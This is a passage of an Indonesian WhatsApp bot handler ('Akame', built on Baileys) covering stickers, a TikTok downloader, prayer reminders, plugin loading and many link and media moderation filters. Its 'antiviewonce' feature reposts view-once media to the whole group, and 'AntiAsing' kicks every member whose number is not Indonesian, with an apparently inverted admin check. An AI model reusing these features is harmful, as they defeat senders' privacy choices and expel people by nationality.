          .webp({ quality: 70 })
          .toBuffer();

        const penis = await addExif(webpBuffer, global.packname, global.author);

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await Kyyhst.sendMessage(
          m.chat,
          {
            sticker: penis,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: `Akame`,
                body: `Akame Always With You`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: global.thumb,
                sourceUrl: `https://youtube.com/@KyyHosr`,
              },
            },
          },
          { quoted: m }
        );

        fs.unlinkSync(fileName);
      } catch (error) {
        console.error("Error creating sticker:", error);
        m.reply("Terjadi kesalahan saat membuat stiker. Coba lagi nanti.");
      }
    }

async function reply(txt) {
const Akame = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `Hii ${pushname}`,
newsletterJid: `120363405649403674@newsletter`,
},
externalAdReply: {  
showAdAttribution: true,
title: `${waktuucapan}`,
body: '- Akame || AI',
thumbnailUrl: `https://files.catbox.moe/b2a5ky.jpg`,
sourceUrl: 't.me/AlwaysKyyXdz',
},
},
text: txt,
}
return Kyyhst.sendMessage(m.chat, Akame, {
quoted: m,
})
}

const reply2 = (teks) => {
Kyyhst.sendMessage(from, { text : teks }, { quoted : m })
}

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}
//==================================================================\\
//==================================================================\\


//==================================================================\\
// F U N T I O N A U T O D O W N L O A D
//=================================================================\\
if (
  budy.startsWith('https://vt.tiktok.com/') || 
  budy.startsWith('https://www.tiktok.com/') || 
  budy.startsWith('https://t.tiktok.com/') || 
  budy.startsWith('https://vm.tiktok.com/')
) {
  Kyyhst.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  try {
    const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(budy)}`);
    const vidnya = data?.video?.noWatermark;
    if (vidnya) {
      const caption = `\`[ ᴛɪᴋᴛᴏᴋ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ ]\`
      
> ᴠɪᴅᴇᴏ ᴅᴀʀɪ : _${data.author?.name ?? 'Tidak diketahui'} (@${data.author?.unique_id ?? 'Tidak diketahui'})_
> ʟɪᴋᴇs : _${data.stats?.likeCount ?? 'Tidak diketahui'}_
> ᴄᴏᴍᴍᴇɴᴛ : _${data.stats?.commentCount ?? 'Tidak diketahui'}_
> sʜᴀʀᴇ : _${data.stats?.shareCount ?? 'Tidak diketahui'}_
> ᴘʟᴀʏ : _${data.stats?.playCount ?? 'Tidak diketahui'}_
> sᴀᴠᴇs : _${data.stats?.saveCount ?? 'Tidak diketahui'}_

\`⏤͟͟͞͞ ᗪᴏᴡɴʟᴏᴀᴅᴇʀ ʙʏ ${botname}\``;

      await Kyyhst.sendMessage(
        m.chat, 
        { caption, video: { url: vidnya } }, 
        { quoted: m }
      );
    } else {
      const nyut = await DinzIDTTDL(budy);
      await Kyyhst.sendMessage(
        m.chat, 
        {
          caption: `Judul: ${nyut.title ?? 'Tidak diketahui'}\nDeskripsi: ${nyut.description ?? 'Tidak diketahui'}`,
          video: { url: nyut.downloadLink || nyut.hdDownloadLink },
        },
        { quoted: m }
      );
    }
  } catch (error) {
    console.error(error);
    replyyoimiya('Maaf, terjadi kesalahan saat memproses permintaan Anda.');
  }
}
//==================================================================\\
//==================================================================\\



//==================================================================\\
// FUNCTION WAKTU
//==================================================================\\
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
		// +minutes+":"+sec;
  }

// Sayying time
const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Selamat Malam 🌃'
}
if(timee < "19:00:00"){
var waktuucapan = 'Selamat Petang 🌆'
}
if(timee < "18:00:00"){
var waktuucapan = 'Selamat Sore 🌅'
}
if(timee < "15:00:00"){
var waktuucapan = 'Selamat Siang 🏙'
}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi 🌄'
}
if(timee < "05:00:00"){
var waktuucapan = 'Selamat Subuh 🌉'
}
if(timee < "03:00:00"){
var waktuucapan = 'Tengah Malam 🌌'
}

Kyyhst.autoshalat = Kyyhst.autoshalat ? Kyyhst.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? Kyyhst.user.id : m.sender
	let id = m.chat 
    if(id in Kyyhst.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:50',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '18:16',
    isya: '19:27',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Makassar dan sekitarnya._`
    Kyyhst.autoshalat[id] = [
    reply(caption),
    setTimeout(async () => {
    delete Kyyhst.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }
    //==================================================================\\      
    //==================================================================\\



//==================================================================\\
// DID YOU MEAN
//==================================================================\\
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Maaf, command yang kamu berikan salah. mungkin ini yang kamu maksud:\n\n─> ${prefix+mean}\n─> Kemiripan: ${similarityPercentage}%`
m.reply(response)
}}

const SESSION_FILE = "./session/ai_sessions.json";

let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};

function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}
//==================================================================\\
//==================================================================\\



//==================================================================\\
// FUNCTION ANTI GROUP / JAGA GROUP
//==================================================================\\
        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await Kyyhst.sendMessage(m.chat, { forward: val }, { quoted: xy })
    }
    
    // Anti promotion
if (db.data.chats[m.chat].antipromotion) {
if (budy.match(`Buy|Promo|Sell|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!isBotAdmins) return
if(isCreator) return
if (isAdmins) return
Kyyhst.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
Kyyhst.sendMessage(from, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a promotion message and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}


// ANTI BOT
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmins || !isBotAdmins){		  
        } else {
          reply(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
// ANTI MEDIA
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return Kyyhst.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }

// ANTI IMAGE
        if (db.data.chats[m.chat].image && isXMEDIA) {
    if(isXMEDIA === "imageMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return Kyyhst.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI VIDEO
        if (db.data.chats[m.chat].antivideo && isXMEDIA) {
    if(isXMEDIA === "videoMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return Kyyhst.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTU STICKER
        if (db.data.chats[m.chat].antisticker && isXMEDIA) {
    if(isXMEDIA === "stickerMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return Kyyhst.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI AUDIO
        if (db.data.chats[m.chat].antiaudio && isXMEDIA) {
    if(isXMEDIA === "audioMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return Kyyhst.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI POLLING
       if (db.data.chats[m.chat].antipoll && isXMEDIA) {
    if(isXMEDIA === "pollCreationMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return Kyyhst.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI LOCATION
       if (db.data.chats[m.chat].antilocation && isXMEDIA) {
    if(isXMEDIA === "locationMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return Kyyhst.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI DOCUMENT
       if (db.data.chats[m.chat].antidocument && isXMEDIA) {
    if(isXMEDIA === "documentMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return Kyyhst.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI CONTACT
      if (db.data.chats[m.chat].anticontact && isXMEDIA) {
    if(isXMEDIA === "contactMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return Kyyhst.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI LINK GC DEL
if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
               await Kyyhst.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyyhst.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }

if (AntiLink)
if (budy.toLowerCase().includes("chat.whatsapp.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
 // Antiwame by Xyroo
if (AntiWame)
if (budy.toLowerCase().includes("wa.me")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by Xyroo
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return reply(mess.botAdmin)
  await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//antiasing by Xyroo
if (m.isGroup && isBotAdmins && AntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!groupAdmins && !isCreator) {
} else
await Kyyhst.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video by Xyroo
if (AntiLinkYoutubeVid)
if (budy.toLowerCase().includes("youtu.be")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by Xyroo
if (AntiLinkYoutubeChannel)
if (budy.toLowerCase().includes("youtube.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink instagram by Xyroo
if (AntiLinkInstagram)
if (budy.toLowerCase().includes("instagram.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by Xyroo
if (AntiLinkFacebook)
if (budy.toLowerCase().includes("facebook.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by Xyroo
if (AntiLinkTelegram)
if (budy.toLowerCase().includes("t.me")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by Xyroo
if (AntiLinkTiktok)
if (budy.toLowerCase().includes("tiktok.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by Xyroo
if (AntiLinkTwitter)
if (budy.toLowerCase().includes("twitter.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by Xyroo
if (AntiLinkAll)
if (budy.toLowerCase().includes("http")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilinkbokep by Xyroo
if (AntiDewasa)
if (budy.toLowerCase().includes("doods")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antiterabox by Xyroo
if (AntiTerabox)
if (budy.toLowerCase().includes("terabox")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//anti mediafire by Xyroo
if (AntiMediafire)
if (budy.toLowerCase().includes("mediafire")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
await Kyyhst.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Kyyhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Kyyhst.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//==================================================================\\
//==================================================================\\



//==================================================================\\
// FUNTION PLUGINS VERSION 1
//==================================================================\\
    const pluginsLoader = async (directory) => {
      let plugins = [];
      const folders = fs.readdirSync(directory);
      folders.forEach((file) => {
        const filePath = path.join(directory, file);
        if (filePath.endsWith(".js")) {
          try {
            const resolvedPath = require.resolve(filePath);
            if (require.cache[resolvedPath]) {
              delete require.cache[resolvedPath];
            }
            const plugin = require(filePath);
            plugins.push(plugin);
          } catch (error) {
            console.log(`Error loading plugin at ${filePath}:`, error);
          }
        }
      });
      return plugins;
    };

    let pluginsDisable = true;
    const plugins = await pluginsLoader(path.resolve(__dirname, "plugins-v1"));
    const kyykzy = {
Kyyhst, m, prefix, isCmd, command, text, sender, botNumber, senderNumber, isCreator, pushname, isBot, quoted, mime, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reSize, fkethmb, smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep,clockString, checkBandwidth, runtime, tanggal, getRandom, reply, reply2, hariini,timee, waktuucapan, example
    };
    for (let plugin of plugins) {
      if (plugin.command.find((e) => e == command.toLowerCase())) {
        pluginsDisable = false;
        if (typeof plugin !== "function") return;
        await plugin(m, kyykzy);
      }
    }
    if (!pluginsDisable) return;


//==================================================================\\
// FUNCTIOIN PLUGINS V2
//==================================================================\\
    const loadPlugins = (directory) => {
      let pluginsx = [];
      const folders = fs.readdirSync(directory);
      folders.forEach((folder) => {
        const folderPath = path.join(directory, folder);
        if (fs.lstatSync(folderPath).isDirectory()) {
          const files = fs.readdirSync(folderPath);
          files.forEach((file) => {
            const filePath = path.join(folderPath, file);
            if (filePath.endsWith(".js")) {
              try {
                delete require.cache[require.resolve(filePath)];
                const pluginx = require(filePath);
                pluginx.filePath = filePath;
                pluginsx.push(pluginx);
              } catch (error) {
                console.error(`Error loading plugin at ${filePath}:`, error);
              }
            }
          });
        }
      });
      return pluginsx;
    };
    // Ngambil semua plugin dari direktori plugin
    const pluginsx = loadPlugins(path.resolve(__dirname, "./plugins-v2"));
    const context = {
Kyyhst, m, prefix, isCmd, command, text, sender, botNumber, senderNumber, isCreator, pushname, isBot, quoted, mime, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reSize, fkethmb, smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep,clockString, checkBandwidth, runtime, tanggal, getRandom, reply, reply2, hariini,timee, waktuucapan, example
    };
    // Kode ini ngeliat plugin satu per satu, kalo nemu plugin yang cocok ama command yang diterima, dia langsung manggil fungsi operate-nya dan berhenti.
    let handled = false;
    for (const pluginx of pluginsx) {
      if (pluginx.command.includes(command)) {
        try {
          await pluginx.operate(context);
          handled = true;
        } catch (error) {
          console.error(`Error executing plugin ${pluginx.filePath}:`, error);
        }
        break;
      }
    }
 
//==================================================================\\       
//=================[ TEMPAT CASE DI BAWAH INI ]=================\\
switch(command) {


case 'menu': case 'help':{
if (!isRegistered) return reply(`*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ`)
Kyyhst.sendMessage(from, {react: {text: "😆", key: m.key}})
let yy1 = "`"
let menu = `ʜᴀʟᴏ ᴋᴀᴋ ${pushname} 👏
